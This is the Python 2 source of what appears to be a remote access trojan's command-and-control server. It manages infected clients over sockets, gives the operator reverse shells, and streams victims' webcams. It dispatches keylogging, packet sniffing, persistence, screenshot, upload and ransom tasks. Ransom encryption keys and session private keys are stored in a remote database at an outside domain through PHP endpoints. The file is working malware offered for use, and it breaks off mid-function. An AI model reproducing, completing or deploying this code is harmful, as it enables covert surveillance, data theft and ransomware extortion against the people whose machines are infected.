#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2017 colental
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.


from __future__ import print_function

import os
import sys
import cv2
import json
import time
import numpy
import Queue
import pickle
import socket
import struct
import base64
import random
import urllib2
import functools
import requests
import tempfile
import colorama
import threading
import subprocess
import SocketServer
from  coinbase.wallet import client
from Crypto.PublicKey import RSA
from Crypto.Hash import HMAC, SHA256
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.number import long_to_bytes, bytes_to_long


BANNER = '''



,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a 88       88
,adPPPPP88 88       88 8b       88 88	       8b	88
88,    ,88 88       88 "8a,   ,d88 88	       "8a,   ,d88
`"8bbdP"Y8 88       88  `"YbbdP"Y8 88           `"YbbdP"Y8
                        aa,    ,88 	        aa,    ,88
                         "Y8bbdP"          	 "Y8bbdP'

                                               88                          ,d
                                               88                          88
 ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
8PP""""""" 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
"8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
 `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
            aa,    ,88  aa,    ,88 88                                      "Y888
             "Y8bbdP"    "Y8bbdP"  88



'''


# default port for the server to listen on
PORT = 1337


# public website with PHP scripts embedded for remote database interaction
DATABASE = {
    'domain': 'https://snapchat.sex/',
    'pages' : {
        'query'     : 'query.php',
        'session'   : 'session.php',
        'ransom'    : 'ransom.php'
    },
    'session_key': None,
    'tasks': ['keylogger','packetsniffer','persistence','ransom','screenshot','webcam','upload']
}


# server is contained to the local network if debugging mode is true
DEBUG = False


# comment the following line to disable colored console
colorama.init()



class ServerThread(threading.Thread):

    global threads

    
    def __init__(self, port, **kwargs):
        super(ServerThread, self).__init__()
        self.exit_status    = 0
        self.clients        = {}
        self.count          = 1
        self.current_client = None
        self.q              = Queue.Queue()
        self.shell          = threading.Event()
        self.lock           = threading.Lock()
        self.commands       = {
            'back'          :   self.background_client,
            'client'        :   self.select_client,
            'clients'       :   self.list_clients,
            'exit'          :   self.quit_server,
            'help'          :   self.show_usage_help,
            'kill'          :   self.remove_client,
            'quit'          :   self.quit_server,
            'query'         :   self.query_database,
            'ransom'        :   self.ransom_client,
            'restore'       :   self.restore_client,
            'results'       :   self.show_task_results,
            'save'          :   self.save_task_results,
	    'sendall'	    :   self.sendall_clients,
            'settings'      :   self.display_settings,
            'session'       :   self.get_current_session,
            'webcam'        :   self.webcam_client,
            }
        self.db             = globals().get('DATABASE')
        self._rand_color    = lambda: getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','WHITE','MAGENTA']))
        self._text_color    = self._rand_color()
        self._text_style    = colorama.Style.DIM
        self._prompt_color  = colorama.Fore.RESET
        self._prompt_style  = colorama.Style.BRIGHT
        self.name           = time.time()
        self.db['session_key'] = self._diffiehellman()
        self.s              = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('localhost', port)) if globals().get('DEBUG') else self.s.bind(('0.0.0.0', port))
        self.s.listen(100)

    def _prompt(self, data):
        return raw_input(self._prompt_color + self._prompt_style + '\n' + data + self._text_color + self._text_style)
    
    def _error(self, data):
        if self.current_client:
            with self.current_client.lock:
                print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Server Error: ' + data + '\n')
        else:
            with self.lock:
                print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Server Error: ' + data + '\n')
            print(self._text_color + self._text_style)

    def _print(self, data):
        print(self._text_color + self._text_style)
        try:
            data     = json.loads(bytes(data))
            max_len  = "{:<%d}" % int(max([len(i) for i in data.keys()]) + 2)
        except: 
            data = bytes(data)
        if self.current_client:
            with self.current_client.lock:
                try:
                    print(json.dumps({max_len.format(k): v for k,v in data.items()}, indent=2))
                except:
                    print("\n" + data)
        else:
            with self.lock:
                try:
                    print(json.dumps({max_len.format(k): v for k,v in data.items()}, indent=2))
                except:
                    print("\n" + data)

    def _return(self):
        if self.current_client:
            self.shell.clear()
            self.current_client.shell.set()
            return self.current_client.run()
        else:
            self.shell.set()
            return self.run()

    def _pad(self, data, block_size, padding='\x00'):
        return bytes(data) + (block_size - len(bytes(data)) % block_size) * padding

    def _block(self, data, block_size):
        return [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]

    def _xor(self, a, b):
        return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(a,b))

    def _obfuscate(self, data):
        data = bytearray(i for i in reversed(data))
        z    = self._get_nth_prime(len(data) + 1)
        return base64.b64encode(''.join([(chr(data.pop()) if i in self._get_primes(z) else os.urandom(1)) for i in xrange(z)]))

    def _deobfuscate(self, block):
        return bytes().join(chr(bytearray(base64.b64decode(block))[_]) for _ in self._get_primes(len(bytearray(base64.b64decode(block)))))


    def _get_status(self, c):
        data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                  '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                  '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                  '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
        return ', '.join([i for i in data if i])

    def _get_primes(self, n):
        sieve = numpy.ones(n/3 + (n%6==2), dtype=numpy.bool)
        for i in xrange(1,int(n**0.5)/3+1):
            if sieve[i]:
                k=3*i+1|1
                sieve[       k*k/3     ::2*k] = False
                sieve[k*(k-2*(i&1)+4)/3::2*k] = False
        return numpy.r_[2,3,((3*numpy.nonzero(sieve)[0][1:]+1)|1)]

    def _get_nth_prime(self, p):
        return (self._get_primes(i)[-1] for i in xrange(int(p*1.5), int(p*15)) if len(self._get_primes(i)) == p).next()     

    def _encrypt_xor(self, data, key):
        data    = self._pad(data, 8)
        blocks  = self._block(data, 8)
        vector  = os.urandom(8)
        result  = [vector]
        for block in blocks:
            block   = self._xor(vector, block)
            v0, v1  = struct.unpack('!2L', block)
            k       = struct.unpack('!4L', key[:16])
            s, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
            for r in xrange(32):
                v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (s + k[s & 3]))) & mask
                s = (s + delta) & mask
                v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (s + k[s >> 11 & 3]))) & mask
            output  = vector = struct.pack('!2L', v0, v1)
            result.append(output)
        return base64.b64encode(b''.join(result))

    def _decrypt_xor(self, data, key):
        data    = base64.b64decode(data)
        blocks  = self._block(data, 8)
        vector  = blocks[0]
        result  = []
        for block in blocks[1:]:
            v0, v1 = struct.unpack('!2L', block)
            k = struct.unpack('!4L', key[:16])
            delta, mask = 0x9e3779b9L, 0xffffffffL
            s = (delta * 32) & mask
            for r in xrange(32):
                v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (s + k[s >> 11 & 3]))) & mask
                s = (s - delta) & mask
                v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (s + k[s & 3]))) & mask
            decode = struct.pack('!2L', v0, v1)
            output = self._xor(vector, decode)
            vector = block
            result.append(output)
        return ''.join(result).rstrip(b'\0')
    
    def _encrypt_aes(self, plaintext, key):
        try:
            text        = self._pad(plaintext, AES.block_size)
            iv          = os.urandom(AES.block_size)
            cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
            ciphertext  = iv + cipher.encrypt(text)
            hmac_sha256 = HMAC.new(key[max(AES.key_size):], msg=ciphertext, digestmod=SHA256).digest()
            output      = base64.b64encode(ciphertext + hmac_sha256)
            return output
        except Exception as e:
            return self._error(str(e))
            
    def _decrypt_aes(self, ciphertext, key):
        try:
            ciphertext  = base64.b64decode(ciphertext.rstrip())
            iv          = ciphertext[:AES.block_size]
            cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
            read_hmac   = ciphertext[-SHA256.digest_size:]
            calc_hmac   = HMAC.new(key[max(AES.key_size):], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
            output      = cipher.decrypt(ciphertext[AES.block_size:-SHA256.digest_size]).rstrip(b'\0')
            self._error("HMAC-SHA256 hash authentication check failed - transmission may have been compromised\nExpected: '{}'\nReceived: '{}'".format(calc_hmac, read_hmac)) if calc_hmac != read_hmac else None
            return output
        except Exception as e:
            return self._error(str(e))
    
    def _diffiehellman(self):
        try:
            g  = 2
            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            a  = bytes_to_long(os.urandom(32))
            xA = pow(g, a, p)
            xB = requests.post(self.db['domain'] + self.db['pages']['session'], data={'public_key': hex(xA).strip('L'), 'id': '0000000000000000000000000000000000000000000000000000000000000000'}).content
            xB = long(xB)
            x  = pow(xB, a, p)
            return self._obfuscate(SHA256.new(bytes(x).strip('L')).hexdigest())
        except Exception as e:
            return self._error("{} returned error: {}".format(self._diffiehellman.func_name, str(e)))

    def encrypt(self, data, client_id=None):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client = self.clients[int(client_id)]
        elif self.current_client:
            client = self.current_client
        else:
            self._error("Invalid Client ID: {}".format(client_id))
            self._return()
        try:
            return getattr(self, '_encrypt_{}'.format(client.info.get('encryption')))(bytes(data), self._deobfuscate(client.session_key))
        except Exception as e:
            self._error(str(e))

    def decrypt(self, data, client_id=None):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client = self.clients[int(client_id)]
        elif self.current_client:
            client = self.current_client
        else:
            self._error("Invalid Client ID: {}".format(client_id))
            self._return()
        try:
            return getattr(self, '_decrypt_{}'.format(client.info.get('encryption')))(bytes(data), self._deobfuscate(client.session_key))
        except Exception as e:
            self._error(str(e))

    def send_client(self, command, client_id=None):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client = self.clients[int(client_id)]
        elif self.current_client:
            client = self.current_client
        else:
            self._error("Invalid Client ID: {}".format(client_id))
            self._return()
        try:
            task_id = self.new_task_id(command, client_id)
            task    = {'id': task_id, 'client_id': client.info['id'], 'session_id': client.session, 'task': command}
            data    = self.encrypt(json.dumps(task), client.name) + '\n'
            client.connection.sendall(data)
        except Exception as e:
            self._error(str(e))
    
    def recv_client(self, client_id=None):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client  = self.clients[int(client_id)]
        elif self.current_client:
            client  = self.current_client
        else:
            self._error("Invalid Client ID: {}".format(client_id))
            self._return()
        try:
            buf = ''
            while '\n' not in buf:
                try:
                    buf += client.connection.recv(4096)
                except: break
            if buf and len(bytes(buf)):
                try:
                    data = self.decrypt(buf, client.name)
                    try:
                        return json.loads(data)
                    except:
                        return data
                except:
                    return buf
            else:
                self.remove_client(client.name)
                self.shell.set()
                self._return()
        except Exception as e:
            self._error("{} returned error: {}".format(self.recv_client.func_name, str(e)))

    def get_clients(self):
        return [v for v in self.clients.values()]

    def select_client(self, client_id):
        if not str(client_id).isdigit() or int(client_id) not in self.clients:
            self._error('Unable to select client {} - Invalid Client ID'.format(client_id))
            self._return()
        else:
            self.shell.clear()
            if self.current_client:
                self.current_client.shell.clear()
            client = self.clients[int(client_id)]
            self.current_client = client
            print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\t[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Client {} selected".format(client.name, client.address[0]) + self._text_color + self._text_style)
            print(self._text_color + self._text_style)
            self.current_client.shell.set()
            return self.current_client.run()

    def background_client(self, client_id=None):
        if not client_id:
            if self.current_client:
                self.current_client.shell.clear()
        elif str(client_id).isdigit() and int(client_id) in self.clients:
                self.clients[int(client_id)].shell.clear()
        self.current_client = None
        self.shell.set()
        return self.run()
    
    def sendall_clients(self, msg):
        for client in self.get_clients():
            try:
                self.send_client(msg, client.name)
            except Exception as e:
                self._error('{} failed with error: {}'.format(self.sendall_clients.func_name, str(e)))
        self._return()
    
    def remove_client(self, client_id):
        if not str(client_id).isdigit() or int(client_id) not in self.clients:
            return
        else:
            try:
                client = self.clients[int(client_id)]
                client.shell.clear()
                self.send_client('kill', client_id)
                try:
                    client.connection.close()
                except: pass
                try:
                    client.connection.shutdown()
                except: pass
                _ = self.clients.pop(int(client_id), None)
                del _
                print(self._text_color + self._text_style)
                if not self.current_client:
                    with self.lock:
                        print('Client {} disconnected'.format(client_id))
                    self.shell.set()
                    client.shell.clear()
                    return self.run()
                elif int(client_id) == self.current_client.name:
                    with self.current_client.lock:
                        print('Client {} disconnected'.format(client_id))
                    self.shell.clear()
                    self.current_client.shell.set()
                    return self.current_client.run()
                else:
                    with self.lock:
                        print('Client {} disconnected'.format(client_id))
                    self.shell.clear()
                    self.current_client.shell.set()
                    return self.current_client.run()
            except Exception as e:
                self._error('{} failed with error: {}'.format(self.remove_client.func_name, str(e)))


    def list_clients(self):
        lock = self.lock if not self.current_client else self.current_client.lock
        with lock:
            print(self._text_color + colorama.Style.BRIGHT + '\n{:>3}'.format('#') + colorama.Fore.YELLOW + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>64}'.format('Session ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format('IP Address') + colorama.Style.DIM + colorama.Fore.YELLOW  + '\n-----------------------------------------------------------------------------------------')
            for k, v in self.clients.items():
                print(self._text_color + colorama.Style.BRIGHT + '{:>3}'.format(k) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.session) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format(v.address[0]))
            print('\n')
        self._return()
          
    def quit_server(self):
        self.shell.clear()
        for client in self.get_clients():
            try:
                client.shell.set()
                self.send_client('standby', client.name)
            except Exception as e:
                print(str(e))
        sys.exit()

    def display_settings(self, args=None):
        if not args:
            print(colorama.Fore.RESET + colorama.Style.BRIGHT + '\n\n\t\tSettings')
            print(self._text_color + self._text_style + '\tdefault text color + style')
            print(self._prompt_color + self._prompt_style + '\tdefault prompt color + style')
            print(self._text_color + self._text_style)
        else:
            target, _, options = args.partition(' ')
            setting, _, option = options.partition(' ')
            option = option.upper()
            print(self._text_color + self._text_style)
            if target == 'prompt':                
                if setting == 'color':
                    if not hasattr(colorama.Fore, option):
                        print("usage: settings prompt color [value]\ncolors:   white/black/red/yellow/green/cyan/magenta")
                    self._prompt_color = getattr(colorama.Fore, option)
                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "prompt color changed to " + self._prompt_color + self._prompt_style + option)
                elif setting == 'style':
                    if not hasattr(colorama.Style, option):
                        self._print("usage: settings prompt style [value]\nstyles:   bright/normal/dim")
                    self._prompt_style = getattr(colorama.Style, option)
                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "prompt style changed to " + self._prompt_color + self._prompt_style + option)
                else:
                    print("usage: settings prompt <option> [value]")
            elif target == 'text':
                if setting == 'color':
                    if not hasattr(colorama.Fore, option):
                        self._print("usage: settings text color [value]\ncolors:     white/black/red/yellow/green/cyan/magenta")
                    self._text_color = getattr(colorama.Fore, option)
                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "text color changed to " + self._text_color + self._text_style + option)                    
                elif setting == 'style':
                    if not hasattr(colorama.Style, option):
                        self._print("usage: settings text style [value]\nstyles:     bright/normal/dim")
                    self._text_style = getattr(colorama.Style, option)
                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "text style changed to " + self._text_color + self._text_style + option)
                else:
                    print("usage: settings text <option> [value]")
        self._return()

    def show_usage_help(self, data=None):
        info = {"back": "background the current client", "client <id>": "interact with client via reverse shell", "clients": "list current clients", "exit": "exit the program but keep clients alive", "sendall <command>": "send a command to all connected clients", "settings <value> [options]": "list/change current display settings"}
        lock = self.lock if not self.current_client else self.current_client.lock
        info.update(json.loads(data)) if data else None
        max_k, max_v     = int(max([len(k) for k in info.keys()]) + 2), int(max([len(v) for v in info.values()]) + 2)
        min_k, min_v     = int(int(max_k - len('command <argument>'))/2), int(int(max_v - len('description'))/2)
        max_key, max_val = " {:<%d}" % max_k, " {:<%d}" % max_v
        with lock:
            print('\n')
            print(colorama.Fore.YELLOW  + colorama.Style.DIM + '\t.' + '-' * int(max_k + max_v + 3) + colorama.Fore.YELLOW + colorama.Style.DIM + '.')
            print(colorama.Fore.YELLOW  + colorama.Style.DIM + '\t|' + self._text_color + colorama.Style.BRIGHT + ' ' * int(min_k + 1) + 'command <argument>' + ' ' * min_k + colorama.Fore.YELLOW + colorama.Style.DIM + '|' + colorama.Style.BRIGHT + self._text_color + ' ' * int(min_v + 1) + 'description' + ' ' * min_v + colorama.Fore.YELLOW + colorama.Style.DIM + '|')
            print(colorama.Fore.YELLOW  + colorama.Style.DIM + '\t|' + '-' * int(max_k + max_v + 3) + colorama.Fore.YELLOW + colorama.Style.DIM + '|')
            for key in sorted(info):
                print(colorama.Fore.YELLOW  + colorama.Style.DIM + '\t|' + self._text_color + self._text_style + max_key.format(key) + colorama.Fore.YELLOW + colorama.Style.DIM + '|' + self._text_color + max_val.format(str(info[key])) + colorama.Fore.YELLOW + colorama.Style.DIM + '|')
            print(colorama.Fore.YELLOW  + colorama.Style.DIM + "\t'" + '-' * int(max_k + max_v + 3) + colorama.Fore.YELLOW + colorama.Style.DIM + "'")

    def webcam_client(self, args=''):
        try:
            if not self.current_client:
                self._error( "No client selected")
                return
            
            client = self.current_client
            result = ''
            mode, _, arg = args.partition(' ')
            client.shell.clear()
            if not mode or str(mode).lower() == 'stream':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                retries = 5
                while retries > 0:
                    try:
                        port = random.randint(6000,9999)
                        s.bind(('0.0.0.0', port))
                        s.listen(1)
                        cmd = 'webcam stream {}'.format(port)
                        self.send_client(cmd, client.name)
                        conn, addr  = s.accept()
                        break
                    except:
                        retries -= 1
                header_size = struct.calcsize("L")
                window_name = addr[0]
                cv2.namedWindow(window_name)
                data = ""
                try:
                    while True:
                        while len(data) < header_size:
                            data += conn.recv(4096)
                        packed_msg_size = data[:header_size]
                        data = data[header_size:]
                        msg_size = struct.unpack("L", packed_msg_size)[0]
                        while len(data) < msg_size:
                            data += conn.recv(4096)
                        frame_data = data[:msg_size]
                        data = data[msg_size:]
                        frame = pickle.loads(frame_data)
                        cv2.imshow(window_name, frame)
                        key = cv2.waitKey(70)
                        if key == 32:
                            break
                finally:
                    conn.close()
                    cv2.destroyAllWindows()
                    result = 'Webcam stream ended'
            else:
                self.send_client("webcam %s" % args, client.name)
                task    = self.recv_client(client.name)
                result  = task.get('data')
            return result
        except Exception as e:
            self._error("webcam stream failed with error: {}".format(str(e)))

    def ransom_client(self, path):
        if self.current_client:
            client = self.current_client
            port = random.randint(10000, 65535)
            sock = socket.socket()
            sock.bind(('0.0.0.0', port))
            sock.listen(1)
            self.send_client("ransom {} {}".format(path, port), client.name)
            c, a = sock.accept()
            c.settimeout(10.0)
            while True:
                buff = ''
                while '\n' not in buff:
                    try:
                        buff += c.recv(2048)
                    except socket.timeout:
                        break
                if buff and len(str(buff)) and bytes('0' * 64) not in buff:
                    data = self._decrypt_aes(buff, self._deobfuscate(client.session_key))
                    task = json.loads(data)
                    save = self.query_database("INSERT INTO ransom (session_id, file_path, aes_key) VALUES ({})".format("'{}', ".format(i) for i in [task['session_id'], task['data']['file_path'], task['data']['aes_key']]), display=False)
                else:
                    break
        else:
            self._error("No client selected")
            self._return()

    def restore_client(self, *args):
        if self.current_client:
            client = self.current_client
            try:
                result = self.query_database("SELECT * FROM sessions WHERE id='{}'".format(client.session), display=False)
                if result:
                    result = json.loads(result)
                    private_key = result['private_key']
                    self.send_client(private_key, client.name)
                else:
                    return "No private key found for Session ID '{}'".format(client.session)
            except Exception as e:
                self._error("{} returned error: {}".format(self.restore_client.func_name, str(e)))
        else:
            self._error("No client selected")
            self._return()

    def new_task_id(self, command, client_id=None):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client = self.clients[int(client_id)]
        elif self.current_client:
            client = self.current_client
        else:
            self._error("Invalid Client ID: {}".format(client_id))
            self._return()
        try:
            return SHA256.new(bytes(client.info['id']) + bytes(command) + bytes(time.time())).hexdigest()
        except Exception as e:
            self._error("{} returned error: {}".format(self.new_task_id.func_name, str(e)))

    def show_task_results(self, client_id=None):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client = self.clients[int(client_id)]
        elif self.current_client:
            client = self.current_client
        else:
            self._error("No client selected")
            self._return()
        try:
            return self.query_database("SELECT * FROM tasks WHERE session_id='{}'".format(client.session).replace("Array\n(", "").replace("\n)", ""))
        except Exception as e:
            self._error("{} returned error: {}".format(self.show_task_results.func_name, str(e)))
    
    def save_task_results(self, task=None):
        try:
            if task:
                cmd, _, __  = bytes(task.get('task')).partition(' ')
                if cmd in self.db['tasks']:
                    query   = self.query_database("INSERT INTO tasks (id, client_id, session_id, task, data) VALUES ({})".format(', '.join("'{}'".format(i) for i in (str(task['id']), str(task['client_id']), str(task['session_id']), str(task['task']), str(task['data'])))), display=False)
            else:
                if self.current_client:
                    self.send_client('show results', self.current_client.name)
                    output  = self.recv_client(self.current_client.name)
                    results = json.loads(output.get('data'))
                    for task in results:
                        cmd, _, __  = bytes(task.get('task')).partition(' ')
                        if cmd in self.db['tasks']:
                            query   = self.query_database("INSERT INTO tasks (id, client_id, session_id, task, data) VALUES ({})".format(', '.join("'{}'".format(i) for i in (str(task['id']), str(task['client_id']), str(task['session_id']), str(task['task']), str(task['data'])))), display=False)
        except Exception as e:
            self._error("{} returned error: {}".format(self.save_task_results.func_name, str(e)))
        self._return()

    def get_current_session(self):
        try:
            if self.db.get('session_key'):
                return self._deobfuscate(self.db['session_key'])
            else:
                return "No session key found"
        except Exception as e:
            self._error("{} returned error: {}".format(self.get_current_session.func_name, str(e)))
            self._return()

    def query_database(self, query, display=True):
        if self.db.get('session_key'):
            key     = self.db['session_key']
            query   = self._encrypt_aes(query, self._deobfuscate(key))
            data    = requests.post(self.db['domain'] + self.db['pages']['query'], data={'query': query}).content
            if data:
                output  = self._decrypt_aes(data, self._deobfuscate(key))
                if output:
                    if not display:
                        return output
                    else:
                        if '\n' in str(output):
                            output = [_ for _ in str(output).split('\n') if _ if len(str(_)) if not str(_).isspace()]
                            i = 1
                            result = {}
                            for row in output:
                                result.update({i: json.loads(row)})
                                i += 1
                            self._print(json.dumps(result, sort_keys=True))
                        else:
                            self._print(output)
        else:
            self._error("No session key found")
            self._return()
    
    def connection_handler(self):
        while True:
            connection, addr    = self.s.accept()
            private             = RSA.generate(2048)
            public              = private.publickey()
            client              = ClientHandler(connection, address=addr, name=self.count, private_key=private, public_key=public)
            self.clients[self.count]  = client
            self.count  += 1
            client.start()
            self.run() if not self.current_client else self.current_client.run()
            
    def run(self):
        while True:
            try:
                self.shell.wait()
                output              = ''
                cmd_buffer          = self._prompt("[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd())
                if cmd_buffer:
                    cmd, _, action  = cmd_buffer.partition(' ')
                    if cmd in self.commands:
                        try:
                            output  = self.commands[cmd](action) if len(action) else self.commands[cmd]()
                        except Exception as e1:
                            output  = str(e1)
                    elif cmd == 'cd':
                        os.chdir(action)
                    else:
                        try:
                            output = subprocess.check_output(cmd_buffer, shell=True)
                        except: pass
                    if output and len(str(output)):
                        self._print(str(output))
                if self.exit_status:
                    break
            except KeyboardInterrupt:
                break
        print('Server shutting down')
        sys.exit()

    def start(self):
        threads[self.connection_handler.func_name] = threading.Thread(target=self.connection_handler, name=time.time())
        threads[self.run.func_name] = threading.Thread(target=self.run, name=time.time())
        threads[self.connection_handler.func_name].start()
        threads[self.run.func_name].start()
        self.shell.set()


class ClientHandler(threading.Thread):

    global threads

    def __init__(self, connection, **kwargs):
        super(ClientHandler, self).__init__()
        self.prompt         = None
        self.connection     = connection
        self.shell          = threading.Event()
        self.lock           = threading.Lock()
        self.name           = kwargs.get('name')
        self.address        = kwargs.get('address')
        self.public_key     = kwargs.get('public_key')
        self.private_key    = kwargs.get('private_key')
        self.session_key    = self._diffiehellman()
        self.info           = self._info()
        self.session        = self._session()
        self.connection.setblocking(True)

            
    def _prompt(self, data):
        return raw_input(threads['server']._prompt_color + threads['server']._prompt_style + '\n' + bytes(data).rstrip())
             
    def _error(self, data):
        with self.lock:
            print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Client {} Error: '.format(self.name) + bytes(data) + '\n')

    def _kill(self):
        self.shell.clear()
        threads['server'].shell.set()
        threads['server'].remove_client(self.name)
        threads['server'].current_client = None
        threads['server'].run()

    def _info(self):
        buf  = ''
        while '\n' not in buf:
            buf += self.connection.recv(1024)
        try:
            data = threads['server']._decrypt_aes(buf.rstrip(), threads['server']._deobfuscate(self.session_key))
        except Exception as e1:
            self._error("AES decryption error: {}".format(str(e1)))
            try:
                data = threads['server']._decrypt_xor(buf.rstrip(), threads['server']._deobfuscate(self.session_key))
            except Exception as e2:
                self._error("XOR decryption error: {}".format(str(e2)))
        try:
            data  = json.loads(data.rstrip())
            exist = threads['server'].query_database("SELECT * FROM clients WHERE id='{}'".format(data['id']), display=False)            
            if not exist or len(str(exist)) == 0:
                query = threads['server'].query_database("INSERT INTO clients ({}) VALUES ({})".format(', '.join(data.keys()), ', '.join(["'{}'".format(v) for v in data.values()])), display=False)
            else:
                query = threads['server'].query_database("UPDATE clients SET {} WHERE id='{}'".format([", ".join(["{}='{}'".format(k, v) for k, v in data.items()])], data['id']), display=False)
            return data
        except Exception as e3:
            self._error("{} returned error: {}".format(self._info.func_name, str(e3)))
            self._kill()

    def _session(self):
        try:
            query       = threads['server'].query_database("INSERT INTO sessions ({}) VALUES ({})".format(', '.join(['client_id','session_key','private_key','public_key']), ', '.join(["'{}'".format(v) for v in [self.info['id'], self.session_key, self.private_key.exportKey(), self.public_key.exportKey()]])), display=False)
            session_id  = requests.post(threads['server'].db['domain'] + threads['server'].db['pages']['session'], data={'id': self.info['id']}).content
            print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "\n\n\n [+] " + colorama.Fore.RESET + "New connection" + colorama.Style.DIM + "\n\n{:>14}\t\t{}\n{:>15} {:>72}\n".format("Client ID", self.name, "Session ID", session_id) + threads['server']._text_color + threads['server']._text_style)
            ciphertext  = getattr(threads['server'], '_encrypt_{}'.format(self.info.get('encryption')))(session_id, threads['server']._deobfuscate(self.session_key))
            self.connection.sendall(ciphertext + '\n')
            ciphertext  = ""
            while "\n" not in ciphertext:
                ciphertext += self.connection.recv(1024)
            plaintext   = getattr(threads['server'], '_decrypt_{}'.format(self.info.get('encryption')))(ciphertext.rstrip(), threads['server']._deobfuscate(self.session_key))
            request     = json.loads(plaintext)
            if request.get('request') == 'public_key':
                response = getattr(threads['server'], '_encrypt_{}'.format(self.info.get('encryption')))(self.public_key.exportKey(), threads['server']._deobfuscate(self.session_key))
                self.connection.sendall(response + '\n')
            return session_id
        except Exception as e:
            self._error("{} returned error: {}".format(self._session.func_name, str(e)))
            self._kill()

    def _diffiehellman(self):
        try:
            g  = 2
